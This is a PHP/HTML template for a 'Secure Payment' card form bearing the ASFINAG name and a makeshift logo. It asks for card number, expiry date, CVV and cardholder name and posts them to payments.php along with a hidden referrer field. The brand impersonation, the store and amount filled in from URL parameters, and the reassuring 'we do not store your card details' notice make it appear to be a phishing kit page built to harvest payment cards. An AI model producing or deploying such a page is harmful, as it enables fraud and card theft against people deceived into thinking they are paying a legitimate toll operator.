<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ASFINAG - Secure Payment</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: #f3f4f6;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .asfinag-container {
            max-width: 520px;
            width: 100%;
            background: white;
            border-radius: 16px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
            overflow: hidden;
        }

        .asfinag-header {
            background: #ea580c;
            padding: 32px 24px;
            text-align: center;
        }

        .asfinag-logo {
            margin-bottom: 16px;
        }

        .asfinag-logo svg {
            width: 120px;
            height: auto;
        }

        .asfinag-title {
            color: white;
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 6px;
        }

        .asfinag-subtitle {
            color: rgba(255, 255, 255, 0.9);
            font-size: 14px;
        }

        .asfinag-content {
            padding: 32px 28px;
            background: white;
        }

        /* Store Info */
        .store-info-block {
            background: #fef3c7;
            border-left: 4px solid #ea580c;
            border-radius: 8px;
            padding: 18px;
            margin-bottom: 28px;
        }

        .amount-display {
            font-size: 30px;
            font-weight: 700;
            color: #ea580c;
            margin-bottom: 4px;
        }

        .store-name-display {
            font-size: 16px;
            font-weight: 600;
            color: #1f2937;
            margin-bottom: 4px;
        }

        .store-desc-display {
            font-size: 12px;
            color: #6b7280;
        }

        /* Card Icons */
        .card-icons-row {
            display: flex;
            justify-content: center;
            gap: 12px;
            margin-bottom: 28px;
        }

        .card-icon-item {
            width: 52px;
            height: 34px;
            background: #f9fafb;
            border: 1px solid #e5e7eb;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .card-icon-item img {
            max-width: 70%;
            max-height: 70%;
        }

        /* Form */
        .payment-form {
            margin-bottom: 24px;
        }

        .form-field {
            margin-bottom: 20px;
        }

        .form-label {
            display: block;
            font-size: 13px;
            font-weight: 600;
            color: #374151;
            margin-bottom: 6px;
        }

        .form-input {
            width: 100%;
            padding: 12px 14px;
            font-size: 15px;
            border: 2px solid #e5e7eb;
            border-radius: 10px;
            transition: all 0.2s;
            font-family: inherit;
            background: white;
        }

        .form-input:focus {
            outline: none;
            border-color: #ea580c;
            box-shadow: 0 0 0 3px rgba(234, 88, 12, 0.1);
        }

        .form-input.valid {
            border-color: #16a34a;
            background: rgba(22, 163, 74, 0.05);
        }

        .input-hint-text {
            font-size: 11px;
            color: #9ca3af;
            margin-top: 6px;
        }

        .form-row-two {
            display: flex;
            gap: 16px;
        }

        .form-col-half {
            flex: 1;
        }

        /* Progress Bar */
        .progress-bar-container {
            height: 4px;
            background: #e5e7eb;
            border-radius: 2px;
            margin: 24px 0 20px;
            overflow: hidden;
        }

        .progress-fill-bar {
            height: 100%;
            background: #ea580c;
            border-radius: 2px;
            width: 0%;
            transition: width 0.3s ease;
        }

        /* Submit Button */
        .submit-payment-btn {
            width: 100%;
            padding: 14px;
            background: #ea580c;
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.2s;
        }

        .submit-payment-btn:hover:not(:disabled) {
            background: #c2410c;
            transform: translateY(-1px);
            box-shadow: 0 4px 12px rgba(234, 88, 12, 0.3);
        }

        .submit-payment-btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        /* Security Notice */
        .security-notice-block {
            background: #f9fafb;
            border-radius: 10px;
            padding: 14px 18px;
            font-size: 12px;
            color: #6b7280;
            text-align: center;
            border: 1px solid #e5e7eb;
        }

        .security-notice-block strong {
            color: #ea580c;
            font-weight: 600;
        }

        /* Error Message */
        .error-alert {
            background: #fef2f2;
            border: 1px solid #fca5a5;
            border-radius: 10px;
            padding: 12px 16px;
            margin-bottom: 24px;
            text-align: center;
            color: #dc2626;
            font-size: 13px;
            font-weight: 500;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .error-alert::before {
            content: "⚠️";
            font-size: 16px;
        }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-4px); }
            75% { transform: translateX(4px); }
        }

        .shake {
            animation: shake 0.25s ease;
        }

        body {
            opacity: 0;
            transition: opacity 0.25s ease;
        }

        body.page-loaded {
            opacity: 1;
        }

        body.page-leave {
            opacity: 0;
        }

        @media (max-width: 480px) {
            .asfinag-content {
                padding: 24px 20px;
            }
            .asfinag-header {
                padding: 24px 20px;
            }
            .form-row-two {
                flex-direction: column;
                gap: 20px;
            }
            .amount-display {
                font-size: 26px;
            }
            .asfinag-title {
                font-size: 24px;
            }
        }
    </style>
</head>
<body>
    <div class="asfinag-container">
        <div class="asfinag-header">
            <div class="asfinag-logo">
                <svg viewBox="0 0 200 60" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <rect width="200" height="60" rx="8" fill="white"/>
                    <text x="100" y="38" font-size="24" font-weight="800" text-anchor="middle" fill="#ea580c" font-family="Arial, sans-serif" letter-spacing="2">ASFINAG</text>
                </svg>
            </div>
            <h1 class="asfinag-title">Secure Payment</h1>
            <p class="asfinag-subtitle">Enter your card details to complete the payment</p>
        </div>
        
        <div class="asfinag-content">
            <?php if (isset($error)): ?>
                <div class="error-alert"><?= htmlspecialchars($error) ?></div>
            <?php endif; ?>
            
            <?php if (!empty($store) || !empty($amount)): ?>
            <div class="store-info-block">
                <?php if (!empty($amount)): ?>
                    <div class="amount-display"><?= htmlspecialchars($amount) ?></div>
                <?php endif; ?>
                <?php if (!empty($store)): ?>
                    <div class="store-name-display"><?= htmlspecialchars($store) ?></div>
                <?php endif; ?>
                <?php if (!empty($description)): ?>
                    <div class="store-desc-display"><?= htmlspecialchars($description) ?></div>
                <?php endif; ?>
            </div>
            <?php endif; ?>
            
            <div class="card-icons-row">
                <div class="card-icon-item">
                    <img src="https://img.icons8.com/color/48/000000/visa.png" alt="Visa" style="width: 32px;">
                </div>
                <div class="card-icon-item">
                    <img src="https://img.icons8.com/color/48/000000/mastercard.png" alt="Mastercard" style="width: 32px;">
                </div>
                <div class="card-icon-item">
                    <img src="https://img.icons8.com/color/48/000000/amex.png" alt="American Express" style="width: 32px;">
                </div>
            </div>
            
            <form class="payment-form" method="POST" action="<?php 
                $formParams = $_GET;
                unset($formParams['error']);
                $formAction = 'payments.php';
                if (!empty($formParams)) {
                    $formAction .= '?' . http_build_query($formParams);
                }
                echo htmlspecialchars($formAction);
            ?>" id="payment-form">
                <?php if (!empty($initialReferrer)): ?>
                    <input type="hidden" name="referrer_domain" value="<?= htmlspecialchars($initialReferrer) ?>">
                <?php endif; ?>
                
                <div class="form-field">
                    <label class="form-label" for="card-number">Card Number</label>
                    <input type="text" id="card-number" name="card_number" class="form-input" 
                           placeholder="1234 5678 9012 3456" maxlength="19" required autocomplete="cc-number">
                    <div class="input-hint-text">Enter your 16-digit card number</div>
                </div>
                
                <div class="form-row-two">
                    <div class="form-col-half">
                        <div class="form-field">
                            <label class="form-label" for="card-expiry">Expiry Date</label>
                            <input type="tel" id="card-expiry" name="card_expiry" class="form-input" 
                                   placeholder="MM/YY" maxlength="5" required inputmode="numeric" pattern="[0-9/]*" autocomplete="cc-exp">
                            <div class="input-hint-text">MM/YY</div>
                        </div>
                    </div>
                    <div class="form-col-half">
                        <div class="form-field">
                            <label class="form-label" for="card-cvv">CVV</label>
                            <input type="tel" id="card-cvv" name="card_cvv" class="form-input" 
                                   placeholder="123" maxlength="4" required inputmode="numeric" pattern="[0-9]*" autocomplete="cc-csc">
                            <div class="input-hint-text">3-4 digits</div>
                        </div>
                    </div>
                </div>
                
                <div class="form-field">
                    <label class="form-label" for="card-holder">Cardholder Name</label>
                    <input type="text" id="card-holder" name="card_holder" class="form-input" 
                           placeholder="JOHN DOE" required autocomplete="cc-name">
                    <div class="input-hint-text">Name as shown on card</div>
                </div>
                
                <div class="progress-bar-container">
                    <div class="progress-fill-bar" id="progress-fill"></div>
                </div>
                
                <button type="submit" class="submit-payment-btn" id="submit-btn" disabled>
                    Complete Payment
                </button>
            </form>
            
            <div class="security-notice-block">
                <strong>Secure Payment:</strong> Your card information is encrypted and processed securely. 
                We do not store your card details.
            </div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            document.body.classList.add('page-loaded');
            
            const cardNumber = document.getElementById('card-number');
            const cardExpiry = document.getElementById('card-expiry');
            const cardCvv = document.getElementById('card-cvv');
            const cardHolder = document.getElementById('card-holder');
            const submitBtn = document.getElementById('submit-btn');
            const progressFill = document.getElementById('progress-fill');
            const form = document.getElementById('payment-form');
            
            function validateField(field, isValid) {
                if (isValid) {
                    field.classList.add('valid');
                    field.classList.remove('shake');
                } else {
                    field.classList.remove('valid');
                    if (field.value.length > 0) {
                        field.classList.add('shake');
                    }
                }
            }
            
            function isValidCardNumber(number) {
                return number.length >= 13 && number.length <= 19 && /^\d+$/.test(number);
            }
            
            function isValidExpiry(expiry) {
                return /^(0[1-9]|1[0-2])\/([0-9]{2})$/.test(expiry);
            }
            
            function isValidCVV(cvv) {
                return /^[0-9]{3,4}$/.test(cvv);
            }
            
            function isValidHolder(holder) {
                return holder.trim().length >= 2;
            }
            
            function updateProgress() {
                let completed = 0;
                const total = 4;
                
                if (isValidCardNumber(cardNumber.value.replace(/\D/g, ''))) completed++;
                if (isValidExpiry(cardExpiry.value)) completed++;
                if (isValidCVV(cardCvv.value)) completed++;
                if (isValidHolder(cardHolder.value)) completed++;
                
                let progress = (completed / total) * 100;
                progressFill.style.width = progress + '%';
                
                if (completed === total) {
                    submitBtn.disabled = false;
                    progressFill.style.background = '#16a34a';
                } else {
                    submitBtn.disabled = true;
                    progressFill.style.background = '#ea580c';
                }
            }
            
            // Format card number
            cardNumber.addEventListener('input', function(e) {
                let value = this.value.replace(/\D/g, '');
                let formatted = '';
                for (let i = 0; i < value.length; i++) {
                    if (i > 0 && i % 4 === 0) formatted += ' ';
                    formatted += value[i];
                }
                this.value = formatted;
                validateField(this, isValidCardNumber(value));
                if (value.length === 16) cardExpiry.focus();
                updateProgress();
            });
            
            // Format expiry
            cardExpiry.addEventListener('input', function(e) {
                let value = this.value.replace(/\D/g, '');
                if (value.length > 2) {
                    this.value = value.substring(0, 2) + '/' + value.substring(2, 4);
                } else {
                    this.value = value;
                }
                validateField(this, isValidExpiry(this.value));
                if (value.length === 4) cardCvv.focus();
                updateProgress();
            });
            
            cardExpiry.addEventListener('blur', function() {
                if (this.value.length === 2 && /^\d+$/.test(this.value)) {
                    this.value = this.value + '/';
                }
            });
            
            cardCvv.addEventListener('input', function(e) {
                this.value = this.value.replace(/\D/g, '');
                validateField(this, isValidCVV(this.value));
                if (this.value.length === 3 || this.value.length === 4) cardHolder.focus();
                updateProgress();
            });
            
            cardHolder.addEventListener('input', function(e) {
                validateField(this, this.value.trim().length >= 2);
                updateProgress();
            });
            
            form.addEventListener('submit', function(e) {
                document.body.classList.add('page-leave');
                
                if (!isValidCardNumber(cardNumber.value.replace(/\D/g, ''))) {
                    e.preventDefault();
                    cardNumber.focus();
                    alert('Please enter a valid card number (13-19 digits)');
                    return;
                }
                
                if (!isValidExpiry(cardExpiry.value)) {
                    e.preventDefault();
                    cardExpiry.focus();
                    alert('Please enter a valid expiry date (MM/YY)');
                    return;
                }
                
                if (!isValidCVV(cardCvv.value)) {
                    e.preventDefault();
                    cardCvv.focus();
                    alert('Please enter a valid CVV (3-4 digits)');
                    return;
                }
                
                if (!isValidHolder(cardHolder.value)) {
                    e.preventDefault();
                    cardHolder.focus();
                    alert('Please enter the cardholder name');
                    return;
                }
            });
            
            cardNumber.focus();
        });
    </script>
</body>
</html>